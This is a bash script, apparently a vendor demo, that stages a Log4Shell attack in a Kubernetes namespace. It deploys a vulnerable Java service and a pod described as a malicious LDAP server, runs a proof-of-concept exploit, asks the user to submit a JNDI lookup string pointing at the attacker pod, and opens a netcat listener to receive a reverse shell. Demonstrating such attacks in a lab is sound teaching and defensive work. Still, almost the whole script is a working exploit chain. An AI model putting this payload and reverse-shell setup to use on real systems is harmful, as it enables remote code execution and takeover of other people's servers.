#!/bin/bash
ns_val="default"
tput bold setaf 2; echo -ne "Do you wish to specify a namespace? [default=no]: "
read ns_temp

if [[ ! -z $ns_temp ]]
then
  ns_val=$ns_temp
  if [[ -z $(kubectl get ns | grep $ns_val) ]]
  then
  	kubectl create ns $ns_val
  fi
fi
echo
tput bold setaf 2; echo "Deploying a sample Java microservice on namespace '$ns_val'..."
echo
kubectl -n $ns_val apply -f https://raw.githubusercontent.com/accuknox/samples/main/log4j-demo/k8s.yaml
sleep 2
echo
tput bold setaf 2; echo "Deploying malicious ldap server on namespace '$ns_val'..."
echo
kubectl -n $ns_val apply -f https://raw.githubusercontent.com/accuknox/samples/main/log4j-demo/k8s-ldap.yaml
sleep 2
echo
echo "Waiting for pods to be ready."
while [[ "$(kubectl -n $ns_val get pods -l=app=nc-pod -o jsonpath='{.items[*].status.containerStatuses[0].ready}')" != "true" && "$(kubectl -n $ns_val get pods -l=app=java-ms -o jsonpath='{.items[*].status.containerStatuses[0].ready}')" != "true" ]]; do
   sleep 5
done

while true
do
   if [[ -z $(kubectl get po -n $ns_val  | awk '{print $3}' | grep -i terminating) ]]
   then
      break
   fi
done


ip=`kubectl get svc -A | grep nc-svc | awk '{print $5}'`
ip_val=`kubectl get svc -A | grep java-ms-svc | awk '{print $5}'`
echo
tput bold setaf 2; echo "Making the ldap server up and running.."
echo

exec_function() {

	kubectl -n $ns_val exec -i $2 -- $1 2>&1
	echo
}

nc_function() {

	kubectl -n $ns_val exec -it $2 -- $1 
	echo
}

pod_name=$(kubectl -n $ns_val get po -lapp=nc-pod -o name | cut -d/ -f2)
exec_function 'python3 poc.py --userip '$ip' --webport 8000 --lport 4444' $pod_name &

sleep 30

tput bold setaf 2; echo "Please paste '\${jndi:ldap://$ip:1389/a}' on the username field and submit to continue"

firefox http://$ip_val & 

nc_function 'nc -lvnp 4444' $pod_name 
